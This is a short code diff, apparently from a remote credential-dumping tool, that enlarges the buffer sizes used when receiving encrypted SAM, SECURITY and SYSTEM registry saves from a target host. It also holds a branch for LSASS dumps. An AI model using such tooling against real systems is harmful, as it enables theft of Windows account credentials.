@@ -436,14 +436,14 @@ def handle_remote_dump(args):
         enc_rc4_key = typed_rc4_key[1:65]
 
         if reg_dump:
-            sam_save, local_ip = start_server(args.remote, "encrypted SAM save", 10240)
+            sam_save, local_ip = start_server(args.remote, "encrypted SAM save", 51200)
 
             security_save, local_ip = start_server(
-                args.remote, "encrypted SECURITY save", 10240
+                args.remote, "encrypted SECURITY save", 51200
             )
 
             system_save, local_ip = start_server(
-                args.remote, "encrypted SYSTEM save", 51200
+                args.remote, "encrypted SYSTEM save", 102400
             )
 
         if lsass_dump:
